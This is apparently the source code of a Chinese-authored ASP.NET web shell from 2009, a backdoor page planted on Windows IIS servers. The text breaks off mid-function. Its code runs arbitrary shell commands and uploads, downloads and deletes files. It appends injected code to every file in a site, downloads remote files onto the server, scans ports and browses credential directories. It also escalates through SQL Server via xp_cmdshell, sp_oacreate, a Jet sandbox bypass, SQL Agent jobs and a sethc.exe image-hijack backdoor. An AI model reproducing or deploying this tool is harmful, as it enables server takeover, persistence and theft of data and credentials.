<%@ Page Language="C#"  validateRequest="false" AspCompat="true" Debug="true" trace="false"%>
<%@ import Namespace="System.IO" %>
<%@ import Namespace="System.Diagnostics" %>
<%@ import Namespace="System.Threading" %>
<%@ import Namespace="System.Net.Sockets" %>
<%@ import Namespace="System.Net" %>
<%@ import Namespace="System.Data.SqlClient" %>
<%@ import Namespace="Microsoft.Win32" %>
<%@ import Namespace="System.Data.OleDb" %>
<%@ Assembly Name="System.DirectoryServices, Version=2.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A" %>
<%@ import Namespace="System.DirectoryServices" %>
<%@ import Namespace="System.Security.Cryptography" %>
<script runat ="server" >
    public string getself;
    public string getselfurl;
    public string iisusername;
    public string iiswebpath;
    public string iisdk;
    public const string jksessionpass = "ahhacker86";
    /* 
       Code by 夢幻★劍客 && JK1986

       写于 2009.4.22

       Blog: http://www.jk1986.cn
 
       E-mail : ly7666255@163.com && ahhacker86@126.com
   */
    public void getprocess() 
    {
        ListBox1.Items.Clear();
        Process[] pl = Process.GetProcesses();
        foreach (Process g in pl)
        {
            ListBox1.Items.Add(g.ProcessName.ToString());
        }
    }

    public void getsqltq() 
    {
        DropDownList1.Items.Clear();
        DropDownList1.Items.Add("XP_CmdShell");
        DropDownList1.Items.Add("Sp_Oacreate");
        DropDownList1.Items.Add("Xp_Regwrite");
        DropDownList1.Items.Add("SQL Server Agent");
        DropDownList1.Items.Add("SA映像劫持");
    }
    public  void Page_Load(object sender, EventArgs e)
    {
        getselfurl = "http://" +  Request.ServerVariables["HTTP_HOST"] + Request.ServerVariables["PATH_INFO"];
        Server.ScriptTimeout = 775000;
        if (IsPostBack == false  )
        {
            getsqltq();
            getprocess();
            TreeNode tr = new TreeNode("本地硬盘");        
            TreeView1.Nodes.Add(tr);
            TreeView1.ExpandAll();           
            DriveInfo[] getdr = DriveInfo.GetDrives();
            {
                foreach (DriveInfo dr in getdr)
                {
                    TreeNode td = new TreeNode(dr.Name.ToString());
                    tr.ChildNodes.Add(td);                          
                }
                for (int i = 0; i < TreeView1.Nodes.Count; i++)
                {
                    TreeView1.Nodes[i].Expanded = false;          
                }
            }
        }
      getself   = Server.MapPath(Request.ServerVariables["PATH_INFO"]);
     
    }
    public string allfile;
    public void getspyrootfolder(string getfolderstr)
    {
        try
        {
            Label2.Visible = true;
            Label2.Text = "<a href='?action=showfolder&folder=" + Directory.GetParent(getfolderstr) + "'>返回上级目录</a>" + "<br><br>";
        }
        catch (Exception lb) 
        {
            Response.Write("目录不存在！");
            Response.Write(lb.Message.ToString());
        }
        if (Directory.Exists(getfolderstr) == true)
        {
            foreach (string allfile in Directory.GetFileSystemEntries(getfolderstr))
            {
                int getfilex = allfile.LastIndexOf("\\") + 1;
                string getdrname = allfile.Substring(getfilex, allfile.Length - getfilex);
                if (getdrname.Length > 50) 
                {
                    getdrname = getdrname.Substring(0, 50) + "...";
                }
                if (Directory.Exists(allfile) == true)
                {

                    string a = "<br/><div style ='width:631px;'><div style ='width:381px;float:left;'><a href='?action=showfolder&folder=" + allfile + "'>" + getdrname + "</a></div><div style ='margin-left:200px:width:50px;float:left;'><a href='?action=delfolder&folder=" + allfile + "' onclick='return test();' >删除</a></div></div>";
                    Label2.Text = Label2.Text + a;
                    
                }
                else
                {
                    Label1.Text += "<br/><div style ='width:631px;'><div style ='width:381px;float:left;'>" + getdrname + "</div><div style ='margin-left:200px:width:50px;float:left;'><a href='?action=edit&File=" + allfile + "'>编辑</a> <a href='?action=rename&File=" + allfile + "'> 重命名</a>  <a href='?action=down&File=" + allfile + "'>下载</a> <a href='?action=config&File=" + allfile + "'> 属性设置</a>  <a href='?action=del&File=" + allfile + "'onclick='return test();' > 删除</a></div></div><br/>";
                }

            }
        }
    }
    public string getcontent;
    public void getwebfile(string getfilestr)
    {
        try
        {
           
            editpath.Text = getfilestr;
            StreamReader sr = new StreamReader(getfilestr,Encoding.Default ); 
            getcontent = sr.ReadToEnd();
          
            sr.Close();
            sr.Dispose();

        }
        catch (Exception ex)
        {
            Response.Write(ex.Message.ToString());
            return;
        }

    }
    protected void TreeView1_SelectedNodeChanged(object sender, EventArgs e)
    {
        Label1.Text = "";
        Label2.Text = "";
        string getpf = TreeView1.SelectedNode.Text.ToString();
        getspyrootfolder(getpf);
    }
    public string getname;
    public void getrename(string getrenamestr)
    {
        getname = getrenamestr;
    }
    public void getdown(string downfilestr) 
    {
        if (File.Exists(downfilestr) == true) 
        {
            try
            {
                FileInfo fi = new FileInfo(downfilestr);  
                Response.Clear();
                Response.ClearHeaders();
                Response.Buffer = false;
                Response.ContentType = "application/octet-stream";
                Response.AddHeader ("Content-Disposition","attachment;filename=" + HttpUtility.UrlEncode (fi.Name,System.Text.Encoding.UTF8 ));
                Response.AppendHeader ("Content-Length",fi.Length.ToString ());  
                Response.WriteFile (fi.FullName);
                Response.Flush ();
            }
            catch ( Exception e)
            {
                Response.Write(e.Message.ToString());
                Response.End();
            }
        }  
    }
    public string configfilestr;
    public void getconfig(string configfilestr)
    {
        fileconfigpath.Text = configfilestr;
        fileconfigpath.ReadOnly = true;
        string getattstr = File.GetAttributes(configfilestr).ToString();
        if (getattstr.LastIndexOf("ReadOnly") != -1) 
        {
            CheckBox1.Checked = true;
        }
        if (getattstr.LastIndexOf("Hidden") != -1) 
        {
            CheckBox2.Checked = true;
        }
        if (getattstr.LastIndexOf("System") != -1) 
        {
            CheckBox3.Checked = true;
        }
        if (getattstr.LastIndexOf("Archive") != -1) 
        {
            CheckBox4.Checked = true;
        }      
    }
    public void getaction(string getacstr)
    {
        if (Request["action"] == "showfolder")
        {
            Response.Write("<font size=2>当前路径: "  + Request.QueryString["folder"] + "</font>");
            getspyrootfolder(Request.QueryString["folder"]);
        }
        else if (Request.QueryString["action"] == "edit")
        {
            Response.Write("<font size=2>当前路径文件: " + Request.QueryString["File"] + "</font>");
            getwebfile(Request.QueryString["File"]);

        }
        else if (Request.QueryString["action"] == "rename") 
          {
               getrename(Request.QueryString["File"]);  
          }
        else if (Request.QueryString["action"] == "down") 
          {
              getdown(Request.QueryString["File"]);
          }
        else if (Request.QueryString["action"] == "config") 
          {
              getconfig(Request.QueryString["File"]);
          }
        else if (Request.QueryString["action"] == "del") 
          {
            getdel (  Request.QueryString["File"]);
          }
          else if (Request.QueryString["action"] == "delfolder") 
          {
              getdelfolder(Request.QueryString["folder"]);
              Response.Write("<script>alert('删除成功！');location.href='?action=showfolder&folder=" + Server.MapPath(".").Replace(@"\", "%5c") + "'</" + "script>");       
          }
    }
    public void getdelfolder(string delfolderstr) 
    {
        if (Directory.Exists(delfolderstr) == true) 
        {
            foreach (string fod in Directory.GetFileSystemEntries(delfolderstr)) 
            {
                if (Directory.Exists(fod))
                {
                    getdelfolder(fod);
                }
                else 
                {
                    File.Delete(fod.ToString());
                }
            }
            Directory.Delete(delfolderstr);
        }
        
    }
    protected void Label2_Load(object sender, EventArgs e)
    {
        getaction(allfile);
    }
      protected void Button1_Click(object sender, EventArgs e)
    {
        string site;
        string getpath = editpath.Text;
        int ofilext = getpath.LastIndexOf("\\")+1  ;
        site = getpath.Substring (0, ofilext);
        StreamWriter sw = new StreamWriter(getpath,false,Encoding.Default );
        sw.Write(filecontent.Text);
        Response.Write("<script>alert('保存成功！');location.href='?action=showfolder&folder= " + @site.Replace (@"\","%5c") +"'</" + "script>");
        sw.Close();
        sw.Dispose();
        Response.End ();
    }
    protected void Button2_Click(object sender, EventArgs e)
    {
        try
        {
            FileInfo fi = new FileInfo(getname) ;
            fi.MoveTo(refilename.Text.Trim());
            int filext = getname.LastIndexOf("\\") + 1;
            string site = getname.Substring(0,filext);
            Response.Write("<script>alert('重命名成功！');location.href='?action=showfolder&folder= " + @site.Replace(@"\", "%5c") + "'</" + "script>");
        }
        catch (Exception x)
        {
            Response.Write(x.Message.ToString());
            Response.End();
        }
    }
    public void getdel(string delstr) 
    {
        string getfile = Request.QueryString["File"];
        int getext = getfile.LastIndexOf("\\") + 1;
        string weizhi = getfile.Substring(0, getext);
        File.Delete(delstr);
        Response.Write("<script>alert('删除成功!');location.href='?action=showfolder&folder="+ weizhi.Replace (@"\","%5c")  +"'</" + "script>");
    } 
    public void createfolder(string getcfstr) 
    {
        DirectoryInfo di = new DirectoryInfo(Server.MapPath("."));
    }
    public string tv2str;
    protected void TreeView2_SelectedNodeChanged(object sender, EventArgs e)
    {
        Label1.Text = "";
        Label2.Text = "";
        string getpath;
        tv2str = TreeView2.SelectedNode.Text.ToString();
        if (tv2str == "站点根目录") 
        {
            getpath = Request.PhysicalApplicationPath;
            getspyrootfolder(getpath.ToString());
        }
        else if (tv2str == "本程序目录") 
        {
            getpath = Server.MapPath(".");
            getspyrootfolder(getpath.ToString());
        }
    }
    protected void cfolder_Click(object sender, EventArgs e)
    {
        string getcf =  cfolderstr.Text.Trim();
        DirectoryInfo di = new DirectoryInfo(getcf);
        di.Create();
        Response.Write("<script>alert('目录创建成功！');location.href='?action=showfolder&folder=" + Server.MapPath(".").Replace (@"\","%5c") + "'</" + "script>");
    }
    protected void cfilebtn_Click(object sender, EventArgs e)
    {
        string getcfile = cfile.Text.Trim();
        if (Path.GetExtension(getcfile) == "")
        {
            Response.Write("请输入文件!");
            Response.End();
        }
        else
        {
            FileInfo fi = new FileInfo(getcfile);
            fi.Create();
            Response.Write("<script>alert('文件创建成功！');location.href='?action=showfolder&folder=" + Server.MapPath(".").Replace(@"\", "%5c") + "'</" + "script>");
        }
    }
    protected void uploadfile_Click(object sender, EventArgs e)
    {

        try
        {
            string pathfile;
            pathfile = savefile.Text.Trim();
            if (pathfile == "")
            {
                Response.Write("请输入绝对路径!");
                Response.End();
            }
            else if (FileUpload1.PostedFile.FileName.ToString() == "")
            {
                Response.Write("请指定上传文件！");
                return;
                
            }
            else
            {
                
                string getfilename = pathfile.Substring(0, pathfile.LastIndexOf("\\") + 1);
                FileUpload1.PostedFile.SaveAs(pathfile);
                Response.Write("<script>alert('上传成功！');location.href='?action=showfolder&folder=" + getfilename.Replace("\\", "%5c") + "'</" + "script>");
            }
        }
        catch (Exception ex)
        {
            Response.Write(ex.Message.ToString());
            Response.End();
        }
    }
    public void  getallfilestr( string getallstr )
    {
        try
        {
            if (Directory.Exists(getallstr) == true)
            {
                foreach (string i in Directory.GetFileSystemEntries(getallstr))
                {
                    if (Directory.Exists(i) == true)
                    {
                        getallfilestr(i);
                    }
                    else
                    {
                        if (i != getself)
                        {

                            StreamReader sr = new StreamReader(i.ToString(),Encoding.Default );
                            string getall = sr.ReadToEnd();
                            sr.Close();
                            sr.Dispose();
                            StreamWriter sw = new StreamWriter(i.ToString(),false,Encoding.Default );
                            sw.Write(getall + gmcode.Text.Trim());
                            sw.Close();
                            sw.Dispose();
                        }
                    }
                }
            }
        }
        catch (Exception es) 
        {
            Response.Write(es.Message.ToString());
            return;
        }
    }
    public void getqmfilestr(string getqmstr)
    {
        try
        {
            if (Directory.Exists(getqmstr) == true)
            {
                foreach (string j in Directory.GetFileSystemEntries(getqmstr))
                {
                    if (Directory.Exists(j) == true)
                    {
                        getqmfilestr(j);
                    }
                    else
                    {
                        if (j != getself)
                        {

                            StreamReader sr = new StreamReader(j.ToString(),Encoding.Default );
                            string getall = sr.ReadToEnd();
                            sr.Close();
                            sr.Dispose();
                            StreamWriter sw = new StreamWriter(j.ToString(),false ,Encoding.Default );
                            sw.Write(getall.Replace(qmcode.Text, ""));
                            sw.Close();
                            sw.Dispose();
                        }
                    }
                }
            }
        }
        catch (Exception ep)
        {
            Response.Write(ep.Message.ToString());
            return;
        }
    }
    public string omumastr;
    public void getfindmm(string getmmstr)
    {
        try
        {
            if (Directory.Exists(getmmstr) == true)
            {
                foreach (string k in Directory.GetFileSystemEntries(getmmstr))
                {
                    if (Directory.Exists(k) == true)
                    {
                        getfindmm(k);
                    }
                    else
                    {
                        if (k != getself)
                        {

                            StreamReader sr = new StreamReader(k.ToString(),Encoding.Default );
                            string getall = sr.ReadToEnd();
                            getall = getall.ToLower();
                            sr.Close();
                            sr.Dispose();
                            string gettzm;
                            if (tzcode.Text.Trim() != "")
                            {
                                gettzm = "," + tzcode.Text.Trim();
                            }
                            else 
                            {
                                gettzm = "";
                            }
                            string tzm = "wscript.shell,shell.application,wscript.network,vbscript.encode" + gettzm ;
                            string[] tzmsz = tzm.Split(',');
                            foreach (string t in tzmsz) 
                            {
                                if (getall.IndexOf (t.ToString ())  > 0  ) 
                                {
                                    omumastr = omumastr + "<br>" + "<div style ='width:631px;'><div style ='width:381px;float:left;'>" + k + "</div><div style ='margin-left:200px:width:50px;float:left;'><a href='?action=edit&File=" + k + "'>编辑</a>     <a href='?action=del&File=" + k + "'> 删除</a></div></div>";
                                   
                                }
                            }
                            
                        }
                    }
                }
            }
        }
        catch (Exception jk)
        {
            Response.Write(jk.Message.ToString());
            return;
        }
    }
    public string getdbfileall;
    public  string   Getdbfilea ( string getdbstr ) 
    {
        if (Directory.Exists(getdbstr) == true) 
        {
            foreach (string getdbstra in Directory.GetFileSystemEntries(getdbstr)) 
            {
                if (Directory.Exists(getdbstra))
                {
                    Getdbfilea(getdbstra);
                }
                else 
                {
                    getdbfileall =  getdbfileall + "\r\n" + getdbstra;
                }
            }
        }
        return getdbstr  ;
    }
    protected void gm_Click(object sender, EventArgs e)
    {
        string getfs;

        if (bml.Checked == true)
        {
            if (gmcode.Text.Trim() != "")
            {
                getfs = Server.MapPath(".");

                getallfilestr(getfs);
            }
        }
        else if (gml.Checked == true)
        {
            if (qmcode.Text.Trim() != "")
            {
                getfs = Request.PhysicalApplicationPath;
                getallfilestr(getfs);
            }
        }
    }   
   protected void qingma_Click(object sender, EventArgs e)
    {
        string getfs;
        if (bcxml.Checked == true)
        {
            getfs = Server.MapPath(".");
            getqmfilestr(getfs);
        }
        else if (gcxml.Checked == true) 
        {
            getfs = Request.PhysicalApplicationPath;
            getqmfilestr(getfs);
        }
    }
    protected void find_Click(object sender, EventArgs e)
    {
        
        string getwz;
        if (czbml.Checked == true) 
        {
            getwz = Server.MapPath(".");
            getfindmm(getwz);
        }
        else if (czgml.Checked == true) 
        {
            getwz = Request.PhysicalApplicationPath;
            getfindmm(getwz);
        }
    }
    protected void TreeView3_SelectedNodeChanged(object sender, EventArgs e)
    {
        string tqstr;
        Label1.Text = "";
        Label2.Text = "";
        if (TreeView3.SelectedNode.Text == "Program Files") 
        {
            tqstr = System.Environment.GetEnvironmentVariable ("ProgramFiles");
            getspyrootfolder(tqstr);
        }
        else if (TreeView3.SelectedNode.Text == "Documents and Settings") 
        {
            tqstr = System.Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            getspyrootfolder(tqstr);
        }
        else if (TreeView3.SelectedNode.Text == "PcAnywhere") 
        {
            tqstr = @"C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\";
            getspyrootfolder(tqstr);
        }
        else if (TreeView3.SelectedNode.Text == "Serv-U(I)") 
        {
           tqstr =@"C:\Program Files\serv-u\";
           getspyrootfolder(tqstr);
        }
        else if (TreeView3.SelectedNode.Text == "Serv-U(II)") 
        {
            tqstr = @"C:\Program Files\RhinoSoft.com\";
            getspyrootfolder(tqstr);
        }
        else if (TreeView3.SelectedNode.Text == "开始菜单") 
        {
            tqstr = System.Environment.GetFolderPath(Environment.SpecialFolder.StartMenu);
            getspyrootfolder(tqstr);
        }
        else if (TreeView3.SelectedNode.Text == "Real")
        {
            tqstr = @"C:\Program Files\Real\";
            getspyrootfolder(tqstr);
        }
        else if (TreeView3.SelectedNode.Text == "Sql Server")
        {
            tqstr = @"C:\Program Files\Microsoft SQL Server\";
            getspyrootfolder(tqstr);
        }
        else if (TreeView3.SelectedNode.Text == "Config")
        {
            tqstr = @"C:\WINDOWS\system32\config\";
            getspyrootfolder(tqstr);
        }
        else if (TreeView3.SelectedNode.Text == "Inetsrv")
        {
            tqstr = @"C:\WINDOWS\system32\inetsrv\";
            getspyrootfolder(tqstr);
        }
        else if (TreeView3.SelectedNode.Text == "Temp")
        {
            tqstr = @"C:\windows\Temp";
            getspyrootfolder(tqstr);
        }
        else if (TreeView3.SelectedNode.Text == "Repair")
        {
            tqstr = @"C:\WINDOWS\repair\";
            getspyrootfolder(tqstr);
        }
    }
    public string jsjname = "计算机名:   " + System.Environment.MachineName.ToString();
    public string getvs = "Visual Studio 版本:   " + System.Environment.Version.ToString();
    public string getusername ="当前用户:   " + System.Environment.UserName;
    public string getwdir = "系统目录:   " + System.Environment.SystemDirectory.ToString();
    public string systime = "系统时间:   " + System.DateTime.Now.ToString ();
    public string getosname = "操作系统版本:   " + System.Environment.OSVersion.VersionString.ToString();
    protected void TreeView4_SelectedNodeChanged(object sender, EventArgs e)
    {
        Label1.Text = "";
        Label2.Text = "";
    }
    public string ocmd;
    protected void cmdbtn_Click(object sender, EventArgs e)
    {
        Process pr = new Process();
        pr.StartInfo.FileName = cmdurl.Text;
        pr.StartInfo.RedirectStandardOutput = true;
        pr.StartInfo.UseShellExecute = false;
        pr.StartInfo.Arguments = "/c " + cmd.Text.Trim ();
        pr.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        pr.Start();
        StreamReader osr = pr.StandardOutput;
        ocmd = osr.ReadToEnd();
        cmdshow.Text = ocmd;
        osr.Close();
        osr.Dispose();
    }   
    protected void qidong_Click(object sender, EventArgs e)
    {
        if (newjc.Text.Trim() != "")
        {
            Process p = new Process();
            p.StartInfo.FileName = newjc.Text.Trim();
            p.Start();
            ListBox1.Items.Clear();
            getprocess();
        }
    }
    protected void kp_Click(object sender, EventArgs e)
    {
       
        Process[] kp = Process.GetProcesses ();
        foreach ( Process kp1 in kp )
        if (kp1.ProcessName == ListBox1.SelectedValue.ToString()) 
        {
            try
            {
                kp1.Kill();
                Response.Write("<script>alert('成功结束该进程！');location.href='?'</" + "script>");
                ListBox1.Items.Clear();
               
            }
            catch (Exception x) 
            {
                Response.Write(x.Message.ToString());
                Response.End();
            }
        }
    }
    protected void sqlbtn_Click(object sender, EventArgs e)
    {
        sqlshow.Text = "";
        string getport = sqlport.Text.Trim();
        if (getport == "1433")
        {
            getport = "";
        }
        else if (getport == "")
        {
            getport = "";
        }
        else 
        {
            getport = "," + getport;
        }
        
        try
        {
           
           if (DropDownList1.SelectedValue.ToString() == "XP_CmdShell")
           {
               string connstr = "server=." + getport + ";User ID=" + sqlname.Text.Trim() + ";Password=" + sqlpass.Text.Trim();
               SqlConnection conn = new SqlConnection(connstr);
               conn.Open();
               SqlCommand cmd;
               SqlDataReader dr;
               string sqlexist = "select count(*) from master.dbo.sysobjects where xtype='X' and name='XP_CmdShell'";
               cmd = new SqlCommand(sqlexist, conn);
               dr = cmd.ExecuteReader();
               if (dr.Read())
               {
                   int getv = Convert.ToInt32(dr.GetValue(0));
                   dr.Close();
                   dr.Dispose();
                   if (getv != 0)
                   {
                       string cmdshellstr = "exec xp_cmdshell '" + shellcmd.Text.Trim() + "'";
                       cmd = new SqlCommand(cmdshellstr, conn);
                       dr = cmd.ExecuteReader();
                       while (dr.Read())
                       {
                           if (dr.HasRows == true)
                           {
                               for (int m = 0; m < dr.FieldCount; m++)
                               {
                                   this.sqlshow.Text = sqlshow.Text + dr.GetValue(m) + "\r\n";
                               }
                           }
                       }
                       dr.Close();
                       dr.Dispose();
                       cmd.Dispose();
                   }
               }
               conn.Close();
               conn.Dispose();
           }
            else  if (DropDownList1.SelectedValue.ToString() == "Sp_Oacreate") 
           {
              
               try
               {
                   string connstr = "server=." + getport + ";User ID=" + sqlname.Text.Trim() + ";Password=" + sqlpass.Text.Trim();
                   SqlConnection conn = new SqlConnection(connstr);
                   conn.Open();
                   SqlCommand cmd;
                   
                   string jksqlstr = "CREATE TABLE [jnc](ResultTxt nvarchar(1024) NULL);use master declare @o int exec sp_oacreate 'wscript.shell',@o out exec sp_oamethod @o,'run',NULL,'cmd /c" + shellcmd.Text.Trim () + " > 8617.tmp',0,true;BULK INSERT [jnc] FROM '8617.tmp' WITH (KEEPNULLS)";
                   cmd = new SqlCommand(jksqlstr, conn);
                   cmd.ExecuteNonQuery();
                   sqlshow.Text = "命令成功完成！";
                   string jksqlstrdel = "DROP TABLE [jnc];declare @o int exec sp_oacreate 'wscript.shell',@o out exec sp_oamethod @o,'run',NULL,'cmd /c del 8617.tmp'";
                   cmd = new SqlCommand(jksqlstrdel, conn);
                   cmd.ExecuteNonQuery();
                   cmd.Dispose();
                   conn.Close();
                   conn.Dispose();
               }
               catch (Exception xx) 
               {
                   Response.Write(xx.Message.ToString());
                   Response.End();
               }
           }
           else if (DropDownList1.SelectedValue.ToString() == "Xp_Regwrite") 
           {
              
               try
               {
                   string connstr = "server=." + getport + ";User ID=" + sqlname.Text.Trim() + ";Password=" + sqlpass.Text.Trim();
                   SqlConnection conn = new SqlConnection(connstr);
                   conn.Open();
                   SqlCommand cmd;
                  
                   string jksql3 = "exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Jet\\4.0\\Engines','SandBoxMode','REG_DWORD',1";
                   string jksql4 = jksql3 + "select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\\windows\\system32\\ias\\ias.mdb','select shell(\" cmd.exe /c " + shellcmd.Text.Trim () + " \")')";
                   cmd = new SqlCommand(jksql4, conn);
                   cmd.ExecuteNonQuery();
                   sqlshow.Text = "命令成功完成！";
                   cmd.Dispose();
                   conn.Close();
                   conn.Dispose();
               }
               catch (Exception err) 
               {
                   Response.Write(err.Message.ToString());
                   Response.End();
               }
           }
           
           else if (DropDownList1.SelectedItem.ToString() == "SA映像劫持") 
           {
               try
               {
                   string connstr = "server=." + getport + ";User ID=" + sqlname.Text.Trim() + ";Password=" + sqlpass.Text.Trim();
                   SqlConnection conn = new SqlConnection(connstr);
                   conn.Open();
                   SqlCommand cmd;
                  
                   string sayx = "exec master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe','debugger','REG_SZ','c:\\windows\\explorer.exe' ";
                   cmd = new SqlCommand(sayx, conn);
                   cmd.ExecuteNonQuery();
                   cmdshow.Text = "命令成功完成！";
                   cmd.Dispose();
                   conn.Close();
                   conn.Dispose();
               }
               catch (Exception sa)
               {
                   Response.Write(sa.Message.ToString());
                   Response.End();
               }
           }
           
       }
       catch (Exception f)
       {
           Response.Write(f.Message.ToString());
           Response.End();
       }
       
       if (DropDownList1.SelectedValue.ToString() == "SQL Server Agent")
       {

           string connstrs = "server=." + getport + ";User ID=" + sqlname.Text.Trim() + ";Password=" + sqlpass.Text.Trim() + ";database=msdb";
           SqlConnection conns = new SqlConnection(connstrs);
           conns.Open();
           try
           {
               string webname = "Select host_name()";
               SqlCommand  agentcmd = new SqlCommand(webname, conns);
               SqlDataReader  agentdr = agentcmd.ExecuteReader();
               agentdr.Read();
               string websql = agentdr.GetValue(0).ToString();
               string agentsql = "EXEC sp_add_job @job_name = 'jktest'," + " @enabled = 1," + " @delete_level = 1" + " EXEC sp_add_jobstep @job_name = 'jktest'," + " @step_name = 'Exec my sql'," + " @subsystem = 'TSQL'," + " @command = ' exec master..xp_execresultset N''select '''' exec" + " master..xp_cmdshell \"" + shellcmd.Text + ">c:\\jk.txt\"'''''',N''Master'''" + " EXEC sp_add_jobserver @job_name = 'jktest'," + " @server_name = '" + websql + "'" + "  EXEC sp_start_job @job_name = 'jktest'";
               agentdr.Close();
               agentdr.Dispose();
               agentcmd.Dispose();
               agentcmd = new SqlCommand(agentsql, conns);
               agentcmd.ExecuteNonQuery();
               sqlshow.Text = "命令成功完成！";
               agentcmd.Dispose();
               conns.Close();
               conns.Dispose();
           }
           catch (Exception sd)
           {
               Response.Write(sd.Message.ToString());
               Response.End();
           }
       }  
    }
    public string  oregstr;
    protected void readreg_Click(object sender, EventArgs e)
    {
        string jkregstr = regtext.Text.Trim();
        int regindex = jkregstr.IndexOf("\\")+1 ; 
        int reglastindex = jkregstr.LastIndexOf("\\") +1;
        string getzhi = jkregstr.Substring(reglastindex, jkregstr.Length - reglastindex);
        string regstr = jkregstr.Substring(0, regindex).ToUpper();
        string reglaststr = jkregstr.Substring(regindex, reglastindex - regindex);
        switch (regstr) 
        {
            case @"HKEY_LOCAL_MACHINE\":
                RegistryKey rega = Registry.LocalMachine.OpenSubKey(reglaststr);
                oregstr = rega.GetValue(getzhi , "null").ToString();
                 break;
             case @"HKEY_CLASSES_ROOT\":
                 RegistryKey regb = Registry.ClassesRoot.OpenSubKey(reglaststr);
                 oregstr = regb.GetValue(getzhi, "null").ToString();
                 break;
             case @"HKEY_CURRENT_USER\":
                 RegistryKey regc = Registry.CurrentUser.OpenSubKey(reglaststr);
                 oregstr = regc.GetValue(getzhi, "null").ToString();
                 break;
             case @"HKEY_USERS\":
                 RegistryKey regd = Registry.Users.OpenSubKey(reglaststr);
                 oregstr = regd.GetValue(getzhi, "null").ToString();
                 break;
            case @"HKEY_CURRENT_CONFIG\":
                RegistryKey rege = Registry.CurrentConfig.OpenSubKey(reglaststr);
                oregstr = rege.GetValue(getzhi, "null").ToString();
                break;           
        }
    }
    
    protected void scan_Click(object sender, EventArgs e)
    {
        
        string portstr = scanport.Text.Trim();
        string[] getportstr = portstr.Split(',');
       
            foreach (string pt in getportstr)
            {
                try
               {
                  TcpClient tc = new TcpClient();
                  tc.Connect("127.0.0.1", Convert.ToInt32(pt));
                  ListBox2.Items.Add(pt.ToString() + "端口" + "---------------------------------------" + "开放!");
                  tc.Close();
               }
               catch (SocketException)
               {
                   ListBox2.Items.Add(pt.ToString() + "端口" );
               }
              
            }
          
    }
    protected void dbbtn_Click(object sender, EventArgs e)
    {
        string dbporta = dbport.Text;
        if (dbporta  == "1433") 
        {
            dbporta = "";
        }
        else if (dbporta == "")
        {
            dbporta = "";
        }
        else 
        {
            dbporta = "," + dbporta;
        }
        string dbconnstr = "server=." + dbporta + ";User ID=" + dbname.Text.Trim() + ";Password=" + dbpass.Text.Trim() + ";database=msdb";
        SqlConnection dbsqlconn = new SqlConnection(dbconnstr);
        try
        {
            dbsqlconn.Open();
            string webnamea = "Select host_name()";
            SqlCommand dbcmda = new SqlCommand(webnamea, dbsqlconn);
            SqlDataReader dbsr = dbcmda.ExecuteReader();
            dbsr.Read();
            string websqla = dbsr.GetValue(0).ToString();
            string agentsql = "EXEC sp_add_job @job_name = 'jktest'," + " @enabled = 1," + " @delete_level = 1" + " EXEC sp_add_jobstep @job_name = 'jktest'," + " @step_name = 'Exec my sql'," + " @subsystem = 'TSQL'," + " @command = ' exec master..xp_execresultset N''select '''' exec" + " master..xp_cmdshell \"" + dbcmd.Text  + ">c:\\jk.txt\"'''''',N''Master'''" + " EXEC sp_add_jobserver @job_name = 'jktest'," + " @server_name = '" + websqla + "'" + "  EXEC sp_start_job @job_name = 'jktest'";
            dbsr.Close();
            dbsr.Dispose();
            dbcmda.Dispose();
            dbcmda = new SqlCommand(agentsql , dbsqlconn);
            dbcmda.ExecuteNonQuery();
            dbshow.Text = "命令成功完成!";

        }
        catch (Exception) 
        {
            Response.Write( "抱歉,执行命令失败！" );
            Response.End();
           }
    }
    protected void filebtn_Click(object sender, EventArgs e)
    {
        try
        {
            WebClient wc = new WebClient();
            wc.DownloadFile(remoteurl.Text.Trim(), localurl.Text.Trim());
            Response.Write("<script>alert('保存成功！')</" + "script>");
            wc.Dispose();
        }
        catch (Exception n) 
        {
            Response.Write(n.Message.ToString());
            Response.End();
        }
    }

    protected void kubtn_Click(object sender, EventArgs e)
    {
        ListBox3.Items.Clear();
        getlistku();
    }

    protected void kutable_Click(object sender, EventArgs e)
    {
        string kusqlportstr = kusqlport.Text.Trim();
        if (kusqlportstr  == "1433") 
        {
            kusqlportstr  = "";
        }
        else if (kusqlportstr == "")
        {
            kusqlportstr = "";
        }
        else 
        {
            kusqlportstr = "," + kusqlportstr;
        }
        string getkubiao = ListBox3.SelectedItem.ToString();
        ListBox4.Items.Clear();
        string kbstr = "server=." + kusqlportstr + ";User ID=" + kusqlname.Text.Trim() + ";Password=" + kusqlpass.Text.Trim() + ";database=" + getkubiao;
        SqlConnection kbconn = new SqlConnection(kbstr );
        try
        {
            kbconn.Open();
            SqlCommand kbcmd = new SqlCommand("select * from sysobjects where xtype='u'", kbconn);
            SqlDataReader kbdr = kbcmd.ExecuteReader();
            while (kbdr.Read())
            {
                ListBox4.Items.Add(kbdr.GetValue(0).ToString());
            }
            kbdr.Close();
            SqlCommand kbcmda = new SqlCommand("select * from sysobjects where xtype='s'", kbconn);
            kbdr = kbcmda.ExecuteReader();
            while (kbdr.Read())
            {
                ListBox4.Items.Add(kbdr.GetValue(0).ToString());
            }
            kbdr.Close();
            kbdr.Dispose();
            kbconn.Close();
            kbconn.Dispose();
        }
        catch (Exception kberror) 
        {
            Response.Write(kberror.Message.ToString());
            Response.End();
        }
    }
    protected void databtn_Click(object sender, EventArgs e)
    {
        if (ListBox4.Items.Count != 0) 
        {
          if ( ListBox4.SelectedItem.ToString () != "")
          {
              string getdataport = kusqlport.Text.Trim ();
              if (getdataport == "1433")
              {
                  getdataport = "";
              }
              else if (getdataport == "")
              {
                  getdataport = "";
              }
              else 
              {
                  getdataport = "," + getdataport;
              }

              SqlConnection dataconn = new SqlConnection("server=." + getdataport + ";User ID=" + kusqlname.Text.Trim() + ";Password=" + kusqlpass.Text.Trim() + ";database=" + ListBox3.SelectedItem.ToString());
              try
              {
                  string getdatasql = "select * from [" +  ListBox4.SelectedItem.ToString() + "]";  
                  SqlDataAdapter datada = new SqlDataAdapter (getdatasql,dataconn );
                  System.Data.DataSet od  = new System.Data.DataSet ();
                  datada.Fill (od ,ListBox4.SelectedItem.ToString ());
                  this.GridView1.DataSource = od;
